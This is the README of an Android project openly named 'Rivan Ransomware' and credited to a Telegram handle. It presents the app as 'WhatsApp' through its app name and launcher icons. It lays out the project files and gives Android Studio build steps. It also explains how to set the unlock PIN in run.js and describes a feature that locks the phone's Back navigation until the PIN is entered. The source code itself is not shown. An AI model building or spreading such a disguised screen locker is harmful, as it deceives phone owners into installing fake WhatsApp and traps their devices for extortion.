# WhatsApp (Rivan Ransomware APK) — Full Project

**made by https://t.me/halilintardev**

## Struktur Folder
```
app/
├── src/main/
│   ├── AndroidManifest.xml
│   ├── assets/
│   │   ├── index.html
│   │   ├── style.css
│   │   └── run.js
│   ├── java/com/rivan/ransomware/
│   │   └── MainActivity.java
│   └── res/
│       ├── mipmap-mdpi/          ic_launcher.png (48x48)
│       ├── mipmap-hdpi/          ic_launcher.png (72x72)
│       ├── mipmap-xhdpi/         ic_launcher.png (96x96)
│       ├── mipmap-xxhdpi/        ic_launcher.png (144x144)
│       ├── mipmap-xxxhdpi/       ic_launcher.png (192x192)
│       ├── mipmap-anydpi-v26/    ic_launcher.png (512x512)
│       ├── values/strings.xml    → app_name = "WhatsApp"
│       └── xml/network_security_config.xml
├── build.gradle
└── proguard-rules.pro
```

## Cara Build APK
1. Buka folder ini di **Android Studio**
2. Tunggu Gradle sync selesai
3. **Build → Generate Signed Bundle/APK → APK**
4. APK ada di `app/build/outputs/apk/`

## Ganti PIN
Edit `assets/run.js`:
```js
const CORRECT_PIN = "1234"; // ← ganti di sini
```

## Fitur Lock Navigasi
- Tekan YES → tombol Back Android terkunci total
- PIN benar → unlock navigasi → app tertutup otomatis
